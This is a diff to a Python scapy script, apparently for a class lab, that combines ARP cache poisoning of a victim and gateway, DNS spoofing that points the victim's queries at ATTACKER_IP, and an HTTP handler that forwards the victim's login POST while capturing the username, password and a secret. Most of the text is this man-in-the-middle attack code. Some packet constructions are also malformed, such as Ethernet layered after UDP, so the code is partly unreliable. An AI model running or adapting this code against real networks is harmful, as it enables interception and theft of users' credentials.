@@ -7,15 +7,15 @@ from scapy.layers.dns import DNS
 from scapy.layers.inet import UDP, TCP, IP
 from scapy.layers.l2 import Ether, ARP
 from scapy.layers.dns import DNSRR
+from scapy.layers.inet6 import IPv6
 import random
-import socket
 
 INTERFACE = "eth0"
 
 GATEWAY_IP = None
 GATEWAY_HW = None
 ATTACKER_IP = None
-ATTACKER_MAC = None
+ATTACKER_HW = None
 VICTIM_IP = None
 VICTIM_HW = None
 
@@ -26,7 +26,7 @@ class TCPServerState:
 
 http_server_state = TCPServerState.LISTEN
 
-def arp_main(src_hw_addr: str, target_hw_addr: str, gw_hw_addr: str, target_ip_addr: str, gw_ip_address: str) -> None:
+def arp_main(src_hw_addr: str, target_hw_addr: str, gw_hw_addr: str, src_ip_addr: str, target_ip_addr: str, gw_ip_address: str) -> None:
     while True:
         p = Ether(dst=target_hw_addr, src=src_hw_addr) / ARP(op="")
         sendp(p)
@@ -38,16 +38,18 @@ def on_dns_packet(p: Packet) -> None:
 
     # Our environment is only allowing us to access IPv6 packets, if we filter those out we do not get any packets 
     # Victim is trying to contact DNS server (qr = 0)
-    if p[DNS].qr == 0:
+    if p[DNS].qr == 0 and p[IPv6].src == VICTIM_IP:
         # Our response to victim, giving our IP as the IP of the class server 
         # Flip the src/dst for IP and UDP, supply the dst hardware address through Ether
         # DNS response is our IP
-        response = IPv6(src=p[IPv6].dst, dst = p[IPv6].src) / UDP(sport=p[UDP].dport, dport=p[UDP].sport) / Ether(dst=p[Ether].src) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=(ATTACKER_IP)))
+        response = IPv6(src=p[IPv6].dst, dst=p[IPv6].src) / UDP(sport=p[UDP].dport, dport=p[UDP].sport) / Ether(dst=p[Ether].src) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=(ATTACKER_IP)))
+        
         sendp(response, iface=INTERFACE)
         
         # Send message to gateway acting as victim
         # src and dst are the same as the packet received 
-        gateway_msg = IPv6(src=p[IPv6].src, dst = p[IPv6].dst) / UDP(sport=p[UDP].sport, dport=p[UDP].dport) / Ether(dst=p[Ether].dst) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=("class.diverge.dev")))
+        gateway_msg = IPv6(src=p[IPv6].src, dst = p[IPv6].dst) / UDP(sport=p[UDP].sport, dport=p[UDP].dport) / Ether(dst=p[Ether].dst) / DNS(qr=0,id=p[DNS].id, an=DNSRR(rdata=("class.diverge.dev")))
+
         sendp(gateway_msg, iface=INTERFACE)
 
 
@@ -76,16 +78,14 @@ def on_http_packet(p: Packet) -> None:
             http_server_state = TCPServerState.ESTABLISHED
 
     elif http_server_state == TCPServerState.ESTABLISHED:
-        # Recevied a PSH
-        
+        # Recevied a PUSH packet
         username = None
         password = None
 
         if p[TCP].flags == 'PA' and p[IP].src == VICTIM_IP:
             # Forward unaltered POST request to the gateway 
-
-            p[Ether].dst = GW_HW
-            p[IP].dst = GW_IP
+            p[Ether].dst = GATEWAY_HW
+            p[IP].dst = GATEWAY_IP
             sendp(p, iface=INTERFACE)
             
             # Intercepting victim -> gateway interaction, where the victim supplies their username and password
@@ -111,12 +111,13 @@ def on_http_packet(p: Packet) -> None:
                         "secret":secret
                         }
                 print(output)
-             
+
+
 def on_packet(p: Packet) -> None:
     if TCP in p and p[TCP].dport == 1200:
         on_http_packet(p)
     if UDP in p and DNS in p:
-        on_dns_iacket(p)
+        on_dns_packet(p)
 
 
 def main() -> None:
@@ -138,7 +139,7 @@ def main() -> None:
     coloredlogs.install(level="INFO")
 
     logging.info(f"starting ARP hijacker on {INTERFACE}")
-    p = Process(target=arp_main, args=(src_hw_addr, target_hw_addr, gw_hw_addr, target_ip_addr, gw_ip_addr))
+    p = Process(target=arp_main, args=(ATTACKER_HW, VICTIM_HW, GATEWAY_HW, ATTACKER_IP, VICTIM_IP, GATEWAY_IP))
     p.start()
 
     logging.info(f"starting sniffer on {INTERFACE}")
